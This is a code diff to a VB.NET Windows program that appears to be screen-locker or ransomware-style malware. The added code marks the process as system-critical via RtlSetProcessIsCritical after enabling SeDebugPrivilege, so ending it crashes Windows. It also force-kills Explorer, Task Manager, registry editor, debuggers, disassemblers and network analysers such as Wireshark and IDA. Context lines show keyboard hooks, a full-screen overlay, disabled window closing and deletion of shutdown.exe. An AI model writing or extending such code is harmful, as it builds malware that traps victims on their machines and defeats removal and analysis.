@@ -82,6 +82,97 @@ Public Class Form1
     Private Shared Function CallNextHookEx(hhk As IntPtr, nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
     End Function
 
+    Public Class CriticalProcess
+
+        ' Imports for DLL functions
+        <DllImport("advapi32.dll", SetLastError:=True, CharSet:=CharSet.Unicode)>
+        Private Shared Function LookupPrivilegeValue(lpSystemName As String, lpName As String, ByRef lpLuid As LUID) As Boolean
+        End Function
+
+        <DllImport("advapi32.dll", SetLastError:=True)>
+        Private Shared Function AdjustTokenPrivileges(TokenHandle As IntPtr, DisableAllPrivileges As Boolean, ByRef NewState As TokenPrivileges, BufferLength As UInt32, ByRef PreviousState As TokenPrivileges, ByRef ReturnLength As UInt32) As Boolean
+        End Function
+
+        <DllImport("ntdll.dll", SetLastError:=True)>
+        Private Shared Function RtlSetProcessIsCritical(IsCritical As Boolean, IsShutdownInPlace As Boolean, Reserved As IntPtr) As Boolean
+        End Function
+
+        <DllImport("kernel32.dll", SetLastError:=True)>
+        Private Shared Function GetCurrentProcess() As IntPtr
+        End Function
+
+        <DllImport("kernel32.dll", SetLastError:=True)>
+        Private Shared Function OpenProcessToken(ProcessHandle As IntPtr, DesiredAccess As UInt32, ByRef TokenHandle As IntPtr) As Boolean
+        End Function
+
+        <DllImport("kernel32.dll", SetLastError:=True)>
+        Private Shared Function CloseHandle(hObject As IntPtr) As Boolean
+        End Function
+
+        ' Structures
+        <StructLayout(LayoutKind.Sequential)>
+        Private Structure LUID
+            Public LowPart As UInteger
+            Public HighPart As Integer
+        End Structure
+
+        <StructLayout(LayoutKind.Sequential)>
+        Private Structure LUIDAndAttributes
+            Public Luid As LUID
+            Public Attributes As UInteger
+        End Structure
+
+        <StructLayout(LayoutKind.Sequential)>
+        Private Structure TokenPrivileges
+            Public PrivilegeCount As UInteger
+            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=1)>
+            Public Privileges() As LUIDAndAttributes
+        End Structure
+
+        ' Constants
+        Private Const SE_DEBUG_NAME As String = "SeDebugPrivilege"
+        Private Const SE_PRIVILEGE_ENABLED As UInteger = &H2
+        Private Const TOKEN_ADJUST_PRIVILEGES As UInteger = &H20
+        Private Const TOKEN_QUERY As UInteger = &H8
+
+        ' Methods
+        Private Sub SetDebugPrivilege()
+            Dim processHandle As IntPtr = GetCurrentProcess()
+            Dim tokenHandle As IntPtr = IntPtr.Zero
+
+            If OpenProcessToken(processHandle, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, tokenHandle) Then
+                Dim luid As New LUID()
+                If LookupPrivilegeValue(Nothing, SE_DEBUG_NAME, luid) Then
+                    Dim tp As New TokenPrivileges With {
+                    .PrivilegeCount = 1,
+                    .Privileges = New LUIDAndAttributes(0) {}
+                }
+                    tp.Privileges(0) = New LUIDAndAttributes With {
+                    .Luid = luid,
+                    .Attributes = SE_PRIVILEGE_ENABLED
+                }
+
+                    Dim returnLength As UInteger = 0
+                    AdjustTokenPrivileges(tokenHandle, False, tp, Marshal.SizeOf(tp), Nothing, returnLength)
+                End If
+            End If
+
+            CloseHandle(tokenHandle)
+        End Sub
+
+        Public Sub SetProcessCritical()
+            SetDebugPrivilege()
+
+            If RtlSetProcessIsCritical(True, False, IntPtr.Zero) Then
+                ' Process has been set to critical
+            Else
+                Dim err As Integer = Marshal.GetLastWin32Error()
+                Throw New System.ComponentModel.Win32Exception(err)
+            End If
+        End Sub
+
+    End Class
+
     Public Class FullScreenOverlay
         Inherits Form
 
@@ -1096,12 +1187,43 @@ Public Class Form1
         End If
     End Sub
 
-    Private Sub KillExplorer()
+    Private Sub KillExplorerAndMore()
         Try
             'Kill explorer.exe 
             Dim process As New Process()
             process.StartInfo.FileName = "cmd.exe"
-            process.StartInfo.Arguments = "/C taskkill /F /IM explorer.exe"
+            process.StartInfo.Arguments = "/C taskkill /F /IM explorer.exe" &
+                                       " && taskkill /F /IM taskmgr.exe" &
+                                       " && taskkill /F /IM process.exe" &
+                                       " && taskkill /F /IM processhacker.exe" &
+                                       " && taskkill /F /IM ksdumper.exe" &
+                                       " && taskkill /F /IM fiddler.exe" &
+                                       " && taskkill /F /IM httpdebuggerui.exe" &
+                                       " && taskkill /F /IM wireshark.exe" &
+                                       " && taskkill /F /IM httpanalyzerv7.exe" &
+                                       " && taskkill /F /IM decoder.exe" &
+                                       " && taskkill /F /IM regedit.exe" &
+                                       " && taskkill /F /IM procexp.exe" &
+                                       " && taskkill /F /IM dnspy.exe" &
+                                       " && taskkill /F /IM vboxservice.exe" &
+                                       " && taskkill /F /IM burpsuite.exe" &
+                                       " && taskkill /F /IM DbgX.Shell.exe" &
+                                       " && taskkill /F /IM ILSpy.exe" &
+                                       " && taskkill /F /IM ollydbg.exe" &
+                                       " && taskkill /F /IM x32dbg.exe" &
+                                       " && taskkill /F /IM x64dbg.exe" &
+                                       " && taskkill /F /IM gdb.exe" &
+                                       " && taskkill /F /IM idaq.exe" &
+                                       " && taskkill /F /IM idag.exe" &
+                                       " && taskkill /F /IM idaw.exe" &
+                                       " && taskkill /F /IM ida64.exe" &
+                                       " && taskkill /F /IM idag64.exe" &
+                                       " && taskkill /F /IM idaw64.exe" &
+                                       " && taskkill /F /IM idaq64.exe" &
+                                       " && taskkill /F /IM windbg.exe" &
+                                       " && taskkill /F /IM immunitydebugger.exe" &
+                                       " && taskkill /F /IM windasm.exe" &
+                                       " && taskkill /F /IM systeminformer.exe"
             process.StartInfo.CreateNoWindow = True
             process.StartInfo.UseShellExecute = False
             process.Start()
@@ -1127,7 +1249,7 @@ Public Class Form1
 
         ' Execute remaining operations
         SetWallpaper()
-        KillExplorer()
+        KillExplorerAndMore()
         KillGrantAccessAndDeleteShutdownExe()
         WriteMessageToNotepad()
         GrantSelfPermissions()
@@ -1146,6 +1268,12 @@ Public Class Form1
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Try
+            Dim cp As New CriticalProcess()
+            Try
+                cp.SetProcessCritical()
+            Catch ex As Exception
+                Console.WriteLine("Error setting process to critical: " & ex.Message)
+            End Try
             ' Disable Alt + F4 (window close button)
             FormBorderStyle = FormBorderStyle.None
             StartPosition = FormStartPosition.CenterScreen
